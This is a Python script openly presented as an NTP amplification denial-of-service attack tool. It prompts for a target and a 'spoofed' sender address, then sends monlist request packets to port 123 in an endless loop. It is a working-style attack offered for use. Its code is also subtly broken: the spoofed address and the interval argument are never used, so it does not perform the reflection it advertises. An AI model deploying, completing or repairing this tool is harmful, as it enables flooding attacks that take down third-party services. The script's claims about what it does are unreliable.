print("\033[1;31m__        ")
print("\033[1;31m\  / | |__/ | |\ | / _`       ")
print("\033[1;31m \/  | |  \ | | \| \__>       ")
print("\033[0m")

import socket
import time

def send_ntp_packet(destination, port, interval, sender, count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        payload = bytearray([0x17, 0x00, 0x03, 0x2a] + [0x00] * 43)  
        sock.sendto(payload, (destination, port))
        print("\033[1;32mNTP packet successfully sent to {}\033[0m".format(destination))
        if count % 50 == 0:
            print("\033[1;34m----> 50 packets sent <----\033[0m")
    except Exception as e:
        print("\033[1;31mError sending NTP packet to {}: {}\033[0m".format(destination, e))
    finally:
        sock.close()

print("\033[1;32mDrDoS Attack via NTP Amplification\nby t.me/VikingTERMINAL\033[0m")
destination = input("\033[1;35mEnter the IP address or domain to perform the attack: \033[0m")
port = 123
interval = float(input("\033[1;35mEnter the interval between packets (in seconds): \033[0m"))
sender = input("\033[1;35mEnter the spoofed sender IP address: \033[0m")
count = 0

while True:
    send_ntp_packet(destination, port, interval, sender, count)
    count += 1
    time.sleep(interval)
